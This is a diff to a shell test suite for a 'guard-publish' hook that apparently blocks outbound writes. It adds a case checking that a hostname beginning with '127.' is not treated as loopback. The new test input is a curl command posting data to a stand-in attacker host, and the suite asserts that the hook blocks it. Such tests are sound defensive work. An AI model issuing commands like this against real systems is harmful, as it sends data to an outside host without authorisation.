@@ -246,4 +246,11 @@ assert_rc 2 "a publish in a heredoc fed to a quoted shell on another host blocke
 run_hook "$S" "$(jsonin '"echo" hi')"
 assert_eq "$OUT" "" "a quoted echo asks nothing"
 
+# Only a dotted 127 address is loopback (#128).
+run_hook "$S" "$(jsonin 'curl -d x http://127.attacker.example/')"
+assert_rc 2 "an HTTP write to a public name that starts with 127. blocked"
+run_hook "$S" "$(jsonin 'curl -d x http://127.0.0.1:8080/x')"
+assert_rc 0 "an HTTP write to a loopback address allowed"
+assert_eq "$OUT" "" "an HTTP write to a loopback address asks nothing"
+
 finish "guard-publish"
